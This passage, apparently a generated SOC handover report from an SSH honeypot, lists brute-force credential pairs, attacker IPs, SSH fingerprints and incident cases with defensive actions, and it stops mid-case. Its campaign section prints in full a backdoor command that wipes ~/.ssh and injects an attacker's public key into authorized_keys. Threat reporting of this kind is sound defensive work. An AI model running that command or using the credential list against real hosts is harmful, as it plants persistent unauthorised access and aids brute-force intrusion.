# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T10:29:40Z |
| **Shift Time** | 10:29 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **141** |
| Confirmed Threats | **126** |
| False Positives Filtered | **15** (10.6%) |
| Unique Attacker IPs | **66** |
| Countries of Origin | **29** |
| High Severity Cases | **63** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **78** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **87** |
| Unique Credential Pairs | **46** |
| Unique Usernames | **15** |
| Unique Passwords | **46** |
| Successful Auth Pairs | **75** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `ubuntu` | 12 |
| `unknown` | 10 |
| `user` | 9 |
| `default` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `unknown2015` | 6 |
| `default2000` | 6 |
| `centos2020` | 6 |
| `user2015` | 5 |
| `debian2007` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `unknown` | `unknown2015` | 6 |
| `default` | `default2000` | 6 |
| `centos` | `centos2020` | 6 |
| `user` | `user2015` | 5 |
| `debian` | `debian2007` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `support` | `support` | `176.53.159.196` | 2026-08-23T06:55:53 |
| `default` | `Password` | `10.0.0.73` | 2026-08-23T06:56:02 |
| `ubuntu` | `Qazwsxedc` | `217.60.255.130` | 2026-08-23T07:04:09 |
| `root` | `Switch@123` | `217.60.255.130` | 2026-08-23T07:04:13 |
| `unknown` | `123123123` | `10.0.0.73` | 2026-08-23T07:04:36 |
| `nobody` | `nobody2005` | `24.45.235.179` | 2026-08-23T07:08:10 |
| `default` | `Password` | `111.70.32.51` | 2026-08-23T07:12:27 |
| `ubuntu` | `123qwe!@#` | `217.60.255.130` | 2026-08-23T07:13:34 |
| `root` | `Zxc@123` | `217.60.255.130` | 2026-08-23T07:13:38 |
| `user` | `user2015` | `113.200.216.246` | 2026-08-23T07:17:25 |
| `user` | `user2015` | `65.20.189.52` | 2026-08-23T07:17:33 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T07:19:31 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.194.102` | 2026-08-23T07:21:16 |
| `*1` | `$4` | `34.76.194.102` | 2026-08-23T07:21:30 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 4755` | `34.76.194.102` | 2026-08-23T07:21:32 |
| `unknown` | `123123123` | `220.93.167.144` | 2026-08-23T07:22:17 |
| `unknown` | `123123123` | `103.174.145.35` | 2026-08-23T07:22:30 |
| `ubuntu` | `postgres@1234` | `217.60.255.130` | 2026-08-23T07:23:16 |
| `root` | `ubuntu2025` | `217.60.255.130` | 2026-08-23T07:23:20 |
| `unknown` | `unknown2015` | `10.0.0.73` | 2026-08-23T07:23:44 |
| `unknown` | `unknown2015` | `187.115.144.103` | 2026-08-23T07:25:16 |
| `unknown` | `unknown2015` | `201.208.182.123` | 2026-08-23T07:25:23 |
| `user` | `user2015` | `10.0.0.73` | 2026-08-23T07:28:27 |
| `ubuntu` | `1234qwer!@#$QWER` | `217.60.255.130` | 2026-08-23T07:32:47 |
| `root` | `Test123` | `217.60.255.130` | 2026-08-23T07:32:50 |
| `blank` | `blank2010` | `10.0.0.73` | 2026-08-23T07:37:11 |
| `unknown` | `unknown2015` | `103.203.74.119` | 2026-08-23T07:40:53 |
| `unknown` | `unknown2015` | `42.248.129.234` | 2026-08-23T07:41:09 |
| `ubuntu` | `12345a@` | `217.60.255.130` | 2026-08-23T07:42:33 |
| `root` | `server2025` | `217.60.255.130` | 2026-08-23T07:42:35 |
| `user` | `user2015` | `218.149.235.152` | 2026-08-23T07:45:14 |
| `default` | `default2000` | `120.194.50.39` | 2026-08-23T07:50:04 |
| `default` | `default2000` | `63.47.149.59` | 2026-08-23T07:50:12 |
| `ubuntu` | `zxcv123!` | `217.60.255.130` | 2026-08-23T07:52:00 |
| `root` | `123456qwe` | `217.60.255.130` | 2026-08-23T07:52:04 |
| `blank` | `blank2010` | `222.186.68.153` | 2026-08-23T07:54:57 |
| `blank` | `blank2010` | `121.22.99.2` | 2026-08-23T07:55:06 |
| `debian` | `debian2007` | `10.0.0.73` | 2026-08-23T07:56:20 |
| `debian` | `debian2007` | `80.233.77.136` | 2026-08-23T07:57:53 |
| `root` | `LeitboGi0ro` | `168.110.102.254` | 2026-08-23T07:57:54 |
| `root` | `123@@@` | `168.110.102.254` | 2026-08-23T07:57:55 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `64.62.156.10` | 2026-08-23T08:00:06 |
| `default` | `default2000` | `10.0.0.73` | 2026-08-23T08:01:09 |
| `ubuntu` | `P@ssw0rd1234567890` | `217.60.255.130` | 2026-08-23T08:01:39 |
| `root` | `Gg123!@#` | `217.60.255.130` | 2026-08-23T08:01:43 |
| `centos` | `centos2020` | `10.0.0.73` | 2026-08-23T08:09:49 |
| `ubuntu` | `Passw0rd123456!` | `217.60.255.130` | 2026-08-23T08:11:08 |
| `root` | `fastuser123` | `217.60.255.130` | 2026-08-23T08:11:12 |
| `debian` | `debian2007` | `200.170.213.9` | 2026-08-23T08:13:18 |
| `debian` | `debian2007` | `187.93.68.178` | 2026-08-23T08:13:26 |
| `default` | `default2000` | `119.237.15.136` | 2026-08-23T08:17:36 |
| `default` | `default2000` | `211.178.165.251` | 2026-08-23T08:17:46 |
| `ubuntu` | `qazwsx` | `217.60.255.130` | 2026-08-23T08:20:46 |
| `root` | `P@s$w0rd` | `217.60.255.130` | 2026-08-23T08:20:50 |
| `nobody` | `nobody2000` | `101.13.5.28` | 2026-08-23T08:22:39 |
| `nobody` | `nobody2000` | `187.8.120.90` | 2026-08-23T08:22:48 |
| `root` | `Admin2023` | `197.227.8.186` | 2026-08-23T08:27:00 |
| `345gs5662d34` | `345gs5662d34` | `197.227.8.186` | 2026-08-23T08:27:05 |
| `root` | `3245gs5662d34` | `197.227.8.186` | 2026-08-23T08:27:07 |
| `centos` | `centos2020` | `109.233.21.109` | 2026-08-23T08:27:25 |
| `centos` | `centos2020` | `218.202.91.147` | 2026-08-23T08:27:35 |
| `centos` | `centos2020` | `60.174.35.18` | 2026-08-23T08:27:41 |
| `centos` | `centos2020` | `221.199.172.66` | 2026-08-23T08:27:50 |
| `user` | `user2006` | `10.0.0.73` | 2026-08-23T08:29:00 |
| `ubuntu` | `@dm!n1234` | `217.60.255.130` | 2026-08-23T08:30:14 |
| `root` | `Aa123456@` | `217.60.255.130` | 2026-08-23T08:30:18 |
| `user` | `user2006` | `182.95.180.82` | 2026-08-23T08:30:38 |
| `nobody` | `nobody2000` | `10.0.0.73` | 2026-08-23T08:33:48 |
| `admin` | `admin` | `10.0.0.73` | 2026-08-23T08:36:07 |
| `ubuntu` | `Password@123` | `217.60.255.130` | 2026-08-23T08:39:50 |
| `root` | `1q2w3e4r5t` | `217.60.255.130` | 2026-08-23T08:39:54 |
| `centos` | `centos2019` | `10.0.0.73` | 2026-08-23T08:42:25 |
| `user` | `user2006` | `65.20.204.254` | 2026-08-23T08:46:02 |
| `ubuntu` | `Password@12345` | `217.60.255.130` | 2026-08-23T08:49:22 |
| `root` | `!123Zxcvb` | `217.60.255.130` | 2026-08-23T08:49:26 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **141** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 35 |
| OpenSSH | 29 |
| Go SSH scanner | 3 |
| Paramiko (Python) | 2 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 29 | 29 |
| `419da4c91ddb...` | Modern SSH client | 24 | 1 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `eff4c24daffc...` | Modern SSH client | 2 | 1 |
| `6372ee695756...` | Modern SSH client | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 29 | 29 | Mirai/variant |
| `419da4c91ddb...` | libssh | 24 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 4 | — |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |
| `6372ee695756...` | Paramiko (Python) | 2 | 1 | Modern SSH client |
| `5bd26477da54...` | PuTTY | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **4** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `197.227.8.186`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **66** |
| Unique ASNs | **52** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS272066` | FIBRAZUL INTERNET S.R.L. | 3 | LOW |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 3 | HIGH |
| `AS63949` | Akamai Connected Cloud | 3 | HIGH |
| `AS17421` | Mobile Business Group | 2 | HIGH |
| `AS398324` | Censys, Inc. | 2 | HIGH |
| `AS4766` | Korea Telecom | 2 | HIGH |
| `AS10429` | TELEFÔNICA BRASIL S.A | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (63)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-ae3ddf503806

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-23 06:55 |
| **Last Seen** | 2026-08-23 06:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 06:55:52` | `cowrie.session.connect` |
| `2026-08-23 06:55:52` | `cowrie.client.version` |
| `2026-08-23 06:55:52` | `cowrie.client.kex` |
| `2026-08-23 06:55:53` | `cowrie.login.success` |
| `2026-08-23 06:55:53` | `cowrie.direct-tcpip.request` |
| `2026-08-23 06:55:53` | `cowrie.direct-tcpip.data` |
| `2026-08-23 06:55:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7bbc55d1dbf

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:04 |
| **Last Seen** | 2026-08-23 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:04:08` | `cowrie.session.connect` |
| `2026-08-23 07:04:08` | `cowrie.client.version` |
| `2026-08-23 07:04:09` | `cowrie.client.kex` |
| `2026-08-23 07:04:09` | `cowrie.login.success` |
| `2026-08-23 07:04:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:04:10` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:04:10` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:04:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c5beb5a45cb

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:04 |
| **Last Seen** | 2026-08-23 07:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:04:12` | `cowrie.session.connect` |
| `2026-08-23 07:04:12` | `cowrie.client.version` |
| `2026-08-23 07:04:12` | `cowrie.client.kex` |
| `2026-08-23 07:04:13` | `cowrie.login.success` |
| `2026-08-23 07:04:13` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:04:13` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:04:13` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:04:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24858d2afee2

| Field | Detail |
|---|---|
| **Source IP** | `24.45.235[.]179` |
| **First Seen** | 2026-08-23 07:08 |
| **Last Seen** | 2026-08-23 07:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:08:08` | `cowrie.session.connect` |
| `2026-08-23 07:08:09` | `cowrie.client.version` |
| `2026-08-23 07:08:09` | `cowrie.client.kex` |
| `2026-08-23 07:08:10` | `cowrie.login.success` |
| `2026-08-23 07:08:10` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:08:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `24.45.235[.]179` to AbuseIPDB if not already reported
- [ ] Block `24.45.235[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a92b044569a

| Field | Detail |
|---|---|
| **Source IP** | `111.70.32[.]51` |
| **First Seen** | 2026-08-23 07:12 |
| **Last Seen** | 2026-08-23 07:12 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:12:25` | `cowrie.session.connect` |
| `2026-08-23 07:12:25` | `cowrie.client.version` |
| `2026-08-23 07:12:25` | `cowrie.client.kex` |
| `2026-08-23 07:12:27` | `cowrie.login.success` |
| `2026-08-23 07:12:28` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:12:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.32[.]51` to AbuseIPDB if not already reported
- [ ] Block `111.70.32[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f60baebfbb7

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:13 |
| **Last Seen** | 2026-08-23 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:13:33` | `cowrie.session.connect` |
| `2026-08-23 07:13:33` | `cowrie.client.version` |
| `2026-08-23 07:13:33` | `cowrie.client.kex` |
| `2026-08-23 07:13:34` | `cowrie.login.success` |
| `2026-08-23 07:13:34` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:13:35` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:13:35` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:13:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a44b49c73d02

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:13 |
| **Last Seen** | 2026-08-23 07:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:13:37` | `cowrie.session.connect` |
| `2026-08-23 07:13:37` | `cowrie.client.version` |
| `2026-08-23 07:13:37` | `cowrie.client.kex` |
| `2026-08-23 07:13:38` | `cowrie.login.success` |
| `2026-08-23 07:13:38` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:13:38` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:13:38` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:13:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4243c9409839

| Field | Detail |
|---|---|
| **Source IP** | `113.200.216[.]246` |
| **First Seen** | 2026-08-23 07:17 |
| **Last Seen** | 2026-08-23 07:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:17:22` | `cowrie.session.connect` |
| `2026-08-23 07:17:23` | `cowrie.client.version` |
| `2026-08-23 07:17:23` | `cowrie.client.kex` |
| `2026-08-23 07:17:25` | `cowrie.login.success` |
| `2026-08-23 07:17:26` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:17:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `113.200.216[.]246` to AbuseIPDB if not already reported
- [ ] Block `113.200.216[.]246` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9167c9300ce7

| Field | Detail |
|---|---|
| **Source IP** | `65.20.189[.]52` |
| **First Seen** | 2026-08-23 07:17 |
| **Last Seen** | 2026-08-23 07:17 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:17:31` | `cowrie.session.connect` |
| `2026-08-23 07:17:31` | `cowrie.client.version` |
| `2026-08-23 07:17:31` | `cowrie.client.kex` |
| `2026-08-23 07:17:33` | `cowrie.login.success` |
| `2026-08-23 07:17:33` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:17:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.189[.]52` to AbuseIPDB if not already reported
- [ ] Block `65.20.189[.]52` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bae424c39f22

| Field | Detail |
|---|---|
| **Source IP** | `34.76.194[.]102` |
| **First Seen** | 2026-08-23 07:21 |
| **Last Seen** | 2026-08-23 07:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:21:16` | `cowrie.session.connect` |
| `2026-08-23 07:21:16` | `cowrie.login.success` |
| `2026-08-23 07:21:17` | `cowrie.session.params` |
| `2026-08-23 07:21:17` | `cowrie.command.input` |
| `2026-08-23 07:21:17` | `cowrie.command.input` |
| `2026-08-23 07:21:17` | `cowrie.command.failed` |
| `2026-08-23 07:21:17` | `cowrie.command.input` |
| `2026-08-23 07:21:17` | `cowrie.log.closed` |
| `2026-08-23 07:21:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.194[.]102` to AbuseIPDB if not already reported
- [ ] Block `34.76.194[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-185dd6949a5b

| Field | Detail |
|---|---|
| **Source IP** | `34.76.194[.]102` |
| **First Seen** | 2026-08-23 07:21 |
| **Last Seen** | 2026-08-23 07:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:21:30` | `cowrie.session.connect` |
| `2026-08-23 07:21:30` | `cowrie.login.success` |
| `2026-08-23 07:21:30` | `cowrie.session.params` |
| `2026-08-23 07:21:30` | `cowrie.command.input` |
| `2026-08-23 07:21:30` | `cowrie.command.failed` |
| `2026-08-23 07:21:38` | `cowrie.log.closed` |
| `2026-08-23 07:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.194[.]102` to AbuseIPDB if not already reported
- [ ] Block `34.76.194[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a6509984022

| Field | Detail |
|---|---|
| **Source IP** | `34.76.194[.]102` |
| **First Seen** | 2026-08-23 07:21 |
| **Last Seen** | 2026-08-23 07:21 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:21:32` | `cowrie.session.connect` |
| `2026-08-23 07:21:32` | `cowrie.login.success` |
| `2026-08-23 07:21:32` | `cowrie.session.params` |
| `2026-08-23 07:21:32` | `cowrie.command.input` |
| `2026-08-23 07:21:38` | `cowrie.log.closed` |
| `2026-08-23 07:21:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.76.194[.]102` to AbuseIPDB if not already reported
- [ ] Block `34.76.194[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfb04cb3728a

| Field | Detail |
|---|---|
| **Source IP** | `220.93.167[.]144` |
| **First Seen** | 2026-08-23 07:22 |
| **Last Seen** | 2026-08-23 07:22 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:22:13` | `cowrie.session.connect` |
| `2026-08-23 07:22:14` | `cowrie.client.version` |
| `2026-08-23 07:22:14` | `cowrie.client.kex` |
| `2026-08-23 07:22:17` | `cowrie.login.success` |
| `2026-08-23 07:22:18` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:22:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.93.167[.]144` to AbuseIPDB if not already reported
- [ ] Block `220.93.167[.]144` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-031ffc237534

| Field | Detail |
|---|---|
| **Source IP** | `103.174.145[.]35` |
| **First Seen** | 2026-08-23 07:22 |
| **Last Seen** | 2026-08-23 07:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:22:28` | `cowrie.session.connect` |
| `2026-08-23 07:22:29` | `cowrie.client.version` |
| `2026-08-23 07:22:29` | `cowrie.client.kex` |
| `2026-08-23 07:22:30` | `cowrie.login.success` |
| `2026-08-23 07:22:30` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.145[.]35` to AbuseIPDB if not already reported
- [ ] Block `103.174.145[.]35` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c138273141e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 07:23 |
| **Last Seen** | 2026-08-23 07:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 07:23:15` | `cowrie.session.connect` |
| `2026-08-23 07:23:15` | `cowrie.client.version` |
| `2026-08-23 07:23:15` | `cowrie.client.kex` |
| `2026-08-23 07:23:16` | `cowrie.login.success` |
| `2026-08-23 07:23:16` | `cowrie.direct-tcpip.request` |
| `2026-08-23 07:23:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 07:23:16` | `cowrie.direct-tcpip.data` |
| `2026-08-23 07:23:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-547075dcc770

| Field | Detail |
|---|---|
